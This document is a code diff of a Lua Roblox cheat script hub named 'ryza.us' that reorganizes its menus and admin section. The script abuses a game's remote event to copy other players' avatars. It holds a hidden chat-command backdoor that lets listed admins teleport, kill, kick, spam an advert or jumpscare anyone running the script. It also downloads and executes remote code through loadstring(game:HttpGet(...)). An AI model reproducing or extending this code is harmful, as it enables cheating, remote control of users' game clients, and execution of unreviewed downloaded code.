@@ -128,16 +128,15 @@ else
 end
 
 local Window = Fluent:CreateWindow({
-	Title = "ryza.us" --[[.. Fluent.Version]],
+	Title = "ryza.us",
 	SubTitle = "by lvasion",
 	TabWidth = 160,
 	Size = sStoreSize,
-	Acrylic = true, -- The blur may be detectable, setting this to false disables blur entirely
+	Acrylic = true,
 	Theme = "Rose",
-	MinimizeKey = Enum.KeyCode.LeftControl -- Used when theres no MinimizeKeybind
+	MinimizeKey = Enum.KeyCode.LeftControl
 })
 
---Fluent provides Lucide Icons https://lucide.dev/icons/ for the tabs, icons are optional
 local Tabs = {
 	Main = Window:AddTab({ Title = "Main", Icon = "home" }),
 	Players = Window:AddTab({ Title = "Players", Icon = "users" }),
@@ -494,7 +493,7 @@ do
 		Title = "Script Owner",
 		Content = "Pandaphoebe6760"
 	})
-	
+
 	Tabs.Main:AddButton({
 		Title = "Script Users",
 		Description = "Check script users",
@@ -885,19 +884,6 @@ do
 		end
 	})
 
-	JumppowerSlider:OnChanged(function(Value)
-		local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-
-		if char then
-			if char:FindFirstChild("Humanoid") then
-				char.Humanoid.JumpPower = Value
-				char.Humanoid.UseJumpPower = true
-			end
-		end
-	end)
-
-	JumppowerSlider:SetValue(55)
-
 	-- players tab
 
 	function getPlayer(short)
@@ -939,36 +925,38 @@ do
 
 	local _market = game:GetService("MarketplaceService")
 
-	local CopyAvatarInput = Tabs.Players:AddInput("Input", {
-		Title = "Copy Avatar",
-		Default = "",
-		Placeholder = "Username",
-		Numeric = false, -- Only allows numbers
-		Finished = true, -- Only calls callback when you press enter
-		Callback = function(Value)
-			local player = getPlayer(Value)
+	if game.PlaceId == 6884319169 or game.PlaceId == 15546218972 then
+		local CopyAvatarInput = Tabs.Players:AddInput("Input", {
+			Title = "Copy Avatar",
+			Default = "",
+			Placeholder = "Username",
+			Numeric = false, -- Only allows numbers
+			Finished = true, -- Only calls callback when you press enter
+			Callback = function(Value)
+				local player = getPlayer(Value)
 
-			if player then
-				game.ReplicatedStorage:WaitForChild("ModifyUsername"):FireServer(player.Name)
+				if player then
+					game.ReplicatedStorage:WaitForChild("ModifyUsername"):FireServer(player.Name)
 
-				Fluent:Notify({
-					Title = "Notification",
-					Content = "Copying Avatar",
-					SubContent = "We found the user in the server, attempting to copy avatar. This might not work due to in-game copy avatar permissions!", -- Optional
-					Duration = 5 -- Set to nil to make the notification not disappear
-				})
-			else
-				game.ReplicatedStorage:WaitForChild("ModifyUsername"):FireServer(Value)
+					Fluent:Notify({
+						Title = "Notification",
+						Content = "Copying Avatar",
+						SubContent = "We found the user in the server, attempting to copy avatar. This might not work due to in-game copy avatar permissions!", -- Optional
+						Duration = 5 -- Set to nil to make the notification not disappear
+					})
+				else
+					game.ReplicatedStorage:WaitForChild("ModifyUsername"):FireServer(Value)
 
-				Fluent:Notify({
-					Title = "Notification",
-					Content = "Copying Avatar",
-					SubContent = "Failed to find user in server, attempting to copy avtar through server..", -- Optional
-					Duration = 5 -- Set to nil to make the notification not disappear
-				})
+					Fluent:Notify({
+						Title = "Notification",
+						Content = "Copying Avatar",
+						SubContent = "Failed to find user in server, attempting to copy avtar through server..", -- Optional
+						Duration = 5 -- Set to nil to make the notification not disappear
+					})
+				end
 			end
-		end
-	})
+		})
+	end
 
 	Tabs.Players:AddButton({
 		Title = "Spectating",
@@ -2262,47 +2250,49 @@ do
 			Content = "You do not have permissions to use the beta tab, please consider boosting our discord server."
 		})
 	else
-		local cloneEvent = game:GetService("ReplicatedStorage"):WaitForChild("ModifyUsername")
-		local cloneData = {
-			username = "",
-			active = false
-		}
+		if game.PlaceId == 15546218972 or game.PlaceId == 6884319169 then
+			local cloneEvent = game:GetService("ReplicatedStorage"):WaitForChild("ModifyUsername")
+			local cloneData = {
+				username = "",
+				active = false
+			}
 
-		local AutoCopyAvatarInput = Tabs.Exclusive:AddInput("Input", {
-			Title = "Auto Copy Avatar",
-			Default = "",
-			Placeholder = "Username",
-			Numeric = false,
-			Finished = true,
-			Callback = function(Value)
-				cloneData.active = true
-				cloneData.username = Value
-				cloneEvent:FireServer(cloneData.username)
-			end
-		})
-
-		Tabs.Exclusive:AddButton({
-			Title = "Auto Copy Avatar",
-			Description = "Stop copying avatar",
-			Callback = function()
-				cloneData.username = ""
-				cloneData.active = false
-
-				Fluent:Notify({
-					Title = "Auto-Copy Avatar",
-					Content = "Script stalled, force stop initiated.",
-					Duration = 8
-				})
-			end
-		})
-
-		LocalPlayer.CharacterAdded:Connect(function(char)
-			if char and char:WaitForChild("Humanoid") then
-				if cloneData.active and cloneData.username ~= "" then
+			local AutoCopyAvatarInput = Tabs.Exclusive:AddInput("Input", {
+				Title = "Auto Copy Avatar",
+				Default = "",
+				Placeholder = "Username",
+				Numeric = false,
+				Finished = true,
+				Callback = function(Value)
+					cloneData.active = true
+					cloneData.username = Value
 					cloneEvent:FireServer(cloneData.username)
 				end
-			end
-		end)
+			})
+
+			Tabs.Exclusive:AddButton({
+				Title = "Auto Copy Avatar",
+				Description = "Stop copying avatar",
+				Callback = function()
+					cloneData.username = ""
+					cloneData.active = false
+
+					Fluent:Notify({
+						Title = "Auto-Copy Avatar",
+						Content = "Script stalled, force stop initiated.",
+						Duration = 8
+					})
+				end
+			})
+
+			LocalPlayer.CharacterAdded:Connect(function(char)
+				if char and char:WaitForChild("Humanoid") then
+					if cloneData.active and cloneData.username ~= "" then
+						cloneEvent:FireServer(cloneData.username)
+					end
+				end
+			end)
+		end
 
 		Tabs.Exclusive:AddInput("Input", {
 			Title = "Job Id",
@@ -2447,133 +2437,233 @@ do
 		})
 	end
 
+	local permissions = {
+		owners = {
+			"lvasion",
+			"pandaphoebe6760",
+			"ikDebris"
+		},
+		coowner = {
 
-	--Dropdown:SetValue("four")
+		},
+		developers = {
+			"ixpinkyyxi"
+		},
+		staff = {
+			"Khine2011",
+			"1can3uss",
+			"Mysterioustrangerz"
+		}
+	}
 
-	--[[Dropdown:OnChanged(function(Value)
-		print("Dropdown changed:", Value)
-	end)]]
-
-	--[[local Dropdown = Tabs.Main:AddDropdown("Dropdown", {
-		Title = "Dropdown",
-		Values = {"one", "two", "three", "four", "five", "six", "seven", "eight", "nine", "ten", "eleven", "twelve", "thirteen", "fourteen"},
-		Multi = false,
-		Default = 1,
-	})]]
-
-	--Dropdown:SetValue("four")
-
-	--[[Dropdown:OnChanged(function(Value)
-		print("Dropdown changed:", Value)
-	end)]]
-
-
-
-	--[[local MultiDropdown = Tabs.Main:AddDropdown("MultiDropdown", {
-		Title = "Dropdown",
-		Description = "You can select multiple values.",
-		Values = {"one", "two", "three", "four", "five", "six", "seven", "eight", "nine", "ten", "eleven", "twelve", "thirteen", "fourteen"},
-		Multi = true,
-		Default = {"seven", "twelve"},
-	})
-
-	MultiDropdown:SetValue({
-		three = true,
-		five = true,
-		seven = false
-	})
-
-	MultiDropdown:OnChanged(function(Value)
-		local Values = {}
-		for Value, State in next, Value do
-			table.insert(Values, Value)
+	local function findList(list, name)
+		for _, v in ipairs(list) do
+			if v == name then
+				return true
+			end
 		end
-		print("Mutlidropdown changed:", table.concat(Values, ", "))
-	end)]]
+		return false
+	end
 
-	--[[local TColorpicker = Tabs.Main:AddColorpicker("TransparencyColorpicker", {
-		Title = "Colorpicker",
-		Description = "but you can change the transparency.",
-		Transparency = 0,
-		Default = Color3.fromRGB(96, 205, 255)
-	})
+	local admins = {
+		"ikDebris",
+		"lvasion",
+		"restaxts",
+		"ixpinkyyxi"
+	}
 
-	TColorpicker:OnChanged(function()
-		print(
-			"TColorpicker changed:", TColorpicker.Value,
-			"Transparency:", TColorpicker.Transparency
-		)
-	end)
+	if findList(admins, LocalPlayer.Name) then
+		Tabs.Admin:AddButton({
+			Title = "Bring All",
+			Description = "Bring all script user(s)",
+			Callback = function()
+				game:GetService("Players"):Chat("ryza.us(bring)")
+			end
+		})
 
-	-- OnClick is only fired when you press the keybind and the mode is Toggle
-	-- Otherwise, you will have to use Keybind:GetState()
-	Keybind:OnClick(function()
-		print("Keybind clicked:", Keybind:GetState())
-	end)
+		Tabs.Admin:AddButton({
+			Title = "Promote All",
+			Description = "Promote ryza.us from all script user(s)",
+			Callback = function()
+				game:GetService("Players"):Chat("ryza.us(send)")
+			end
+		})
 
-	Keybind:OnChanged(function()
-		print("Keybind changed:", Keybind.Value)
-	end)
+		Tabs.Admin:AddButton({
+			Title = "Kill All",
+			Description = "Kill all script user(s)",
+			Callback = function()
+				game:GetService("Players"):Chat("ryza.us(kill)")
+			end
+		})
+
+		Tabs.Admin:AddButton({
+			Title = "Kick All",
+			Description = "Kick all script user(s)",
+			Callback = function()
+				game:GetService("Players"):Chat("ryza.us(kick)")
+			end
+		})
+
+		Tabs.Admin:AddButton({
+			Title = "Jumpscare All",
+			Description = "Jumpscare all script user(s)",
+			Callback = function()
+				game:GetService("Players"):Chat("ryza.us(jumpscare)")
+			end
+		})
+
+		Tabs.Admin:AddButton({
+			Title = "Flashbang All",
+			Description = "Flashbang all script user(s)",
+			Callback = function()
+				game:GetService("Players"):Chat("ryza.us(flashbang)")
+			end
+		})
+	end
+
+	local function onPlayerAdded(player)
+		player.Chatted:Connect(function(message)
+			if message == "ryza.us(bring)" then
+				if not findList(admins, player.Name) then
+					return
+				end
+
+				if player.Name == LocalPlayer.Name then
+					return
+				end
+
+				if player.Character then
+					local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+
+					if char then
+						char:SetPrimaryPartCFrame(player.Character.PrimaryPart.CFrame)
+					end
+				end
+			elseif message == "ryza.us(kill)" then
+				if not findList(admins, player.Name) then
+					return
+				end
+
+				if player.Name == LocalPlayer.Name then
+					return
+				end
+
+				local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+
+				if char then
+					char.Humanoid.Health = 0
+				end
+			elseif message == "ryza.us(kick)" then
+				if not findList(admins, player.Name) then
+					return
+				end
+
+				if player.Name == LocalPlayer.Name then
+					return
+				end
+
+				LocalPlayer:Kick("kicked by ryza.us administrator")
+			elseif message == "ryza.us(send)" then
+				if not findList(admins, player.Name) then
+					return
+				end
+
+				if player.Name == LocalPlayer.Name then
+					return
+				end
+
+				local TextService = game:GetService("TextChatService")
+				local Channel = TextService.TextChannels:FindFirstChild("RBXGeneral")
+
+				if TextService and Channel then
+					Channel:SendAsync("gg / ryzaus")
+				end
+			elseif message == "ryza.us(jumpscare)" then
+				if not findList(admins, player.Name) then
+					return
+				end
+
+				if jsToggled == true then
+					return
+				end
+
+				local sGui = Instance.new("ScreenGui")
+				sGui.Name = "jumpscare"
+				sGui.IgnoreGuiInset = true
+				sGui.Parent = LocalPlayer.PlayerGui
+				local jump = Instance.new("ImageLabel")
+				jump.Parent = sGui
+				jump.Size = UDim2.new(1, 0, 1, 0)
+				jump.Position = UDim2.new(0, 0, 0, 0)
+				jump.Image = "http://www.roblox.com/asset/?id=94098465509961"
+				local sound = Instance.new("Sound")
+				sound.Parent = sGui
+				sound.SoundId = "rbxassetid://7236490488"
+				sound.Volume = 10
+				sound:Play()
+
+				task.wait(5)
+				sGui:Destroy()
+			elseif message == "ryza.us(flashbang)" then
+				if not findList(admins, player.Name) then
+					return
+				end
+
+				if fbToggled == true then
+					return
+				end
+
+				local sGui = Instance.new("ScreenGui")
+				sGui.Name = "flashbang"
+				sGui.IgnoreGuiInset = true
+				sGui.Parent = LocalPlayer.PlayerGui
+				local jump = Instance.new("Frame")
+				jump.Parent = sGui
+				jump.Size = UDim2.new(1, 0, 1, 0)
+				jump.Position = UDim2.new(0, 0, 0, 0)
+				jump.BackgroundTransparency = 0
+				jump.BackgroundColor3 = Color3.new(1, 1, 1)
+				local sound = Instance.new("Sound")
+				sound.Parent = sGui
+				sound.SoundId = "rbxassetid://17659239587"
+				sound.Volume = 10
+				sound:Play()
+
+				task.wait(5)
+				sGui:Destroy()
+			elseif message == "ryza.us()" then
+				if not UsersList[player.Name] then
+					table.insert(UsersList, player.Name)
+				end
+			end
+		end)
+	end
+
+	for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
+		onPlayerAdded(player)
+	end
+
+	game:GetService("Players").PlayerAdded:Connect(onPlayerAdded)
 
 	task.spawn(function()
 		while true do
-			wait(1)
-
-			-- example for checking if a keybind is being pressed
-			local state = Keybind:GetState()
-			if state then
-				print("Keybind is being held down")
-			end
-
-			if Fluent.Unloaded then break end
+			game:GetService("Players"):Chat("ryza.us()")
+			task.wait(10)
 		end
 	end)
 
-	Keybind:SetValue("MB2", "Toggle") -- Sets keybind to MB2, mode to Hold
-
-
-	local Input = Tabs.Main:AddInput("Input", {
-		Title = "Input",
-		Default = "Default",
-		Placeholder = "Placeholder",
-		Numeric = false, -- Only allows numbers
-		Finished = false, -- Only calls callback when you press enter
-		Callback = function(Value)
-			print("Input changed:", Value)
-		end
-	})
-
-	Input:OnChanged(function()
-		print("Input updated:", Input.Value)
-	end)]]
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/lolnoobsloadstring/a78eft78v638qb476ba78w/refs/heads/main/loader/overhead.lua"))()
 end
 
-
--- Addons:
--- SaveManager (Allows you to have a configuration system)
--- InterfaceManager (Allows you to have a interface managment system)
-
--- Hand the library over to our managers
 SaveManager:SetLibrary(Fluent)
 InterfaceManager:SetLibrary(Fluent)
-
--- Ignore keys that are used by ThemeManager.
--- (we dont want configs to save themes, do we?)
 SaveManager:IgnoreThemeSettings()
-
--- You can add indexes of elements the save manager should ignore
 SaveManager:SetIgnoreIndexes({})
-
--- use case for doing it this way:
--- a script hub could have themes in a global folder
--- and game configs in a separate folder per game
 InterfaceManager:SetFolder("FluentScriptHub")
 SaveManager:SetFolder("FluentScriptHub/specific-game")
-
 InterfaceManager:BuildInterfaceSection(Tabs.Settings)
 SaveManager:BuildConfigSection(Tabs.Settings)
-
-
 Window:SelectTab(1)
 
 Fluent:Notify({
@@ -2587,223 +2677,5 @@ Fluent:Notify({
 	Content = "Our system has loaded successfully, attempting to send webhook data...",
 	Duration = 8
 })
-
-local permissions = {
-	owners = {
-		"lvasion",
-		"pandaphoebe6760",
-		"ikDebris"
-	},
-	coowner = {
-		
-	},
-	developers = {
-		"ixpinkyyxi"
-	},
-	staff = {
-		"Khine2011",
-		"1can3uss",
-		"Mysterioustrangerz"
-	}
-}
-
-local function findList(list, name)
-	for _, v in ipairs(list) do
-		if v == name then
-			return true
-		end
-	end
-	return false
-end
-
-local admins = {
-	"ikDebris",
-	"lvasion",
-	"restaxts",
-	"ixpinkyyxi"
-}
-
-if findList(admins, LocalPlayer.Name) then
-	Tabs.Admin:AddButton({
-		Title = "Bring All",
-		Description = "Bring all script user(s)",
-		Callback = function()
-			game:GetService("Players"):Chat("ryza.us(bring)")
-		end
-	})
-
-	Tabs.Admin:AddButton({
-		Title = "Promote All",
-		Description = "Promote ryza.us from all script user(s)",
-		Callback = function()
-			game:GetService("Players"):Chat("ryza.us(send)")
-		end
-	})
-
-	Tabs.Admin:AddButton({
-		Title = "Kill All",
-		Description = "Kill all script user(s)",
-		Callback = function()
-			game:GetService("Players"):Chat("ryza.us(kill)")
-		end
-	})
-
-	Tabs.Admin:AddButton({
-		Title = "Kick All",
-		Description = "Kick all script user(s)",
-		Callback = function()
-			game:GetService("Players"):Chat("ryza.us(kick)")
-		end
-	})
-
-	Tabs.Admin:AddButton({
-		Title = "Jumpscare All",
-		Description = "Jumpscare all script user(s)",
-		Callback = function()
-			game:GetService("Players"):Chat("ryza.us(jumpscare)")
-		end
-	})
-
-	Tabs.Admin:AddButton({
-		Title = "Flashbang All",
-		Description = "Flashbang all script user(s)",
-		Callback = function()
-			game:GetService("Players"):Chat("ryza.us(flashbang)")
-		end
-	})
-end
-
-local function onPlayerAdded(player)
-	player.Chatted:Connect(function(message)
-		if message == "ryza.us(bring)" then
-			if not findList(admins, player.Name) then
-				return
-			end
-
-			if player.Name == LocalPlayer.Name then
-				return
-			end
-
-			if player.Character then
-				local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-
-				if char then
-					char:SetPrimaryPartCFrame(player.Character.PrimaryPart.CFrame)
-				end
-			end
-		elseif message == "ryza.us(kill)" then
-			if not findList(admins, player.Name) then
-				return
-			end
-
-			if player.Name == LocalPlayer.Name then
-				return
-			end
-
-			local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-
-			if char then
-				char.Humanoid.Health = 0
-			end
-		elseif message == "ryza.us(kick)" then
-			if not findList(admins, player.Name) then
-				return
-			end
-
-			if player.Name == LocalPlayer.Name then
-				return
-			end
-
-			LocalPlayer:Kick("kicked by ryza.us administrator")
-		elseif message == "ryza.us(send)" then
-			if not findList(admins, player.Name) then
-				return
-			end
-
-			if player.Name == LocalPlayer.Name then
-				return
-			end
-
-			local TextService = game:GetService("TextChatService")
-			local Channel = TextService.TextChannels:FindFirstChild("RBXGeneral")
-
-			if TextService and Channel then
-				Channel:SendAsync("gg / ryzaus")
-			end
-		elseif message == "ryza.us(jumpscare)" then
-			if not findList(admins, player.Name) then
-				return
-			end
-
-			if jsToggled == true then
-				return
-			end
-
-			local sGui = Instance.new("ScreenGui")
-			sGui.Name = "jumpscare"
-			sGui.IgnoreGuiInset = true
-			sGui.Parent = LocalPlayer.PlayerGui
-			local jump = Instance.new("ImageLabel")
-			jump.Parent = sGui
-			jump.Size = UDim2.new(1, 0, 1, 0)
-			jump.Position = UDim2.new(0, 0, 0, 0)
-			jump.Image = "http://www.roblox.com/asset/?id=94098465509961"
-			local sound = Instance.new("Sound")
-			sound.Parent = sGui
-			sound.SoundId = "rbxassetid://7236490488"
-			sound.Volume = 10
-			sound:Play()
-
-			task.wait(5)
-			sGui:Destroy()
-		elseif message == "ryza.us(flashbang)" then
-			if not findList(admins, player.Name) then
-				return
-			end
-
-			if fbToggled == true then
-				return
-			end
-
-			local sGui = Instance.new("ScreenGui")
-			sGui.Name = "flashbang"
-			sGui.IgnoreGuiInset = true
-			sGui.Parent = LocalPlayer.PlayerGui
-			local jump = Instance.new("Frame")
-			jump.Parent = sGui
-			jump.Size = UDim2.new(1, 0, 1, 0)
-			jump.Position = UDim2.new(0, 0, 0, 0)
-			jump.BackgroundTransparency = 0
-			jump.BackgroundColor3 = Color3.new(1, 1, 1)
-			local sound = Instance.new("Sound")
-			sound.Parent = sGui
-			sound.SoundId = "rbxassetid://17659239587"
-			sound.Volume = 10
-			sound:Play()
-
-			task.wait(5)
-			sGui:Destroy()
-		elseif message == "ryza.us()" then
-			if not UsersList[player.Name] then
-				table.insert(UsersList, player.Name)
-			end
-		end
-	end)
-end
-
-for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
-	onPlayerAdded(player)
-end
-
-game:GetService("Players").PlayerAdded:Connect(onPlayerAdded)
-
-task.spawn(function()
-	while true do
-		game:GetService("Players"):Chat("ryza.us()")
-		task.wait(10)
-	end
-end)
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/lolnoobsloadstring/a78eft78v638qb476ba78w/refs/heads/main/loader/overhead.lua"))()
 
 SaveManager:LoadAutoloadConfig()
